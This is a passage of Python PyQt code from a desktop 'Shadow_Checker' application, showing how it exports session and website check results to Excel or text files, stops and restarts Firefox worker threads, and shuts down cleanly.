            self.start_btn.setEnabled(True)
            self.threads.setEnabled(True)
            self.log("[CHECKER] All checking tasks completed.")
        self.update_counters()

    def export_to_file(self, data):
        try:
            if getattr(sys, "frozen", False):
                base = Path(sys.executable).resolve().parent
            else:
                base = Path(__file__).resolve().parent.parent

            directory = base / "output" / "Shadow_Checker"
            directory.mkdir(parents=True, exist_ok=True)

            excel = "Excel" in self.mode.currentText()
            extension = ".xlsx" if excel else ".txt"

            if self._export_path is None or self._export_path.suffix != extension:
                if not self._export_session_token:
                    self._export_session_token = (
                        datetime.now().strftime("%Y%m%d_%H%M%S_%f")
                        + "_" + uuid.uuid4().hex[:8]
                    )
                self._export_path = directory / f"Results_{self._export_session_token}{extension}"
            path = self._export_path

            headers = ["Session", "Website", "Status", "Details"]

            file_handle, temporary_name = tempfile.mkstemp(
                dir=directory, prefix=".shadow_results_", suffix=extension,
            )
            os.close(file_handle)
            temporary = Path(temporary_name)
            try:
                if excel:
                    workbook = openpyxl.Workbook()
                    sheet = workbook.active
                    sheet.title = "Results"
                    sheet.append(headers)
                    for row in data:
                        sheet.append(row)
                    workbook.save(temporary)
                else:
                    with temporary.open("w", encoding="utf-8", newline="") as file:
                        file.write("\t".join(headers) + "\n")
                        for row in data:
                            file.write("\t".join(str(value) for value in row) + "\n")
                os.replace(temporary, path)
            finally:
                temporary.unlink(missing_ok=True)
            return path

        except Exception as exc:
            self.log(f"[EXPORT ERROR] {exc}")
            return None

    def stop(self):
        self.stopping = True
        if self.runtime_thread and self.runtime_thread.isRunning():
            self.runtime_thread.stop()

        for worker in self.workers:
            worker.stop()

        self.log("[STOP] Stop requested.")
        self.diagnostic("checker", "stop_requested")

    def restart(self):
        self.stop()
        if self.runtime_thread and self.runtime_thread.isRunning():
            self.log("[SYSTEM] Wait for Runtime to stop.")
            return
        if any(worker.isRunning() for worker in self.workers):
            self.log("[SYSTEM] Wait for Firefox sessions.")
            return
        self.clear_results()
        self.log("[SYSTEM] Ready for a new scan.")

    def clear_results(self):
        self.table.setRowCount(0)
        self.results = []
        self.refresh_stats()
        self.log("[UI] Results cleared.")

    def open_file(self):
        if not self.last_export_path or not Path(self.last_export_path).is_file():
            QMessageBox.information(
                self,
                "Info",
                "No results file available yet.",
            )
            return

        if sys.platform == "win32":
            os.startfile(
                self.last_export_path
            )
        else:
            QMessageBox.information(
                self,
                "File Path",
                str(self.last_export_path),
            )

    def closeEvent(self, event):
        self.stop()
        if self.runtime_thread and self.runtime_thread.isRunning():
            self.runtime_thread.wait(10000)

        for worker in list(self.workers):
            if worker.isRunning():
                worker.wait(5000)

        still_running = (
            self.runtime_thread and self.runtime_thread.isRunning()
        ) or any(worker.isRunning() for worker in self.workers)

        if still_running:
            event.ignore()
            self.log("[SYSTEM] Waiting for threads to finish.")
            return

        self.diagnostic("system", "normal_exit", events=self._diag_count)
        self._diagnostic_dir.cleanup()
        event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = CheckerWindow()
    window.show()
    sys.exit(app.exec())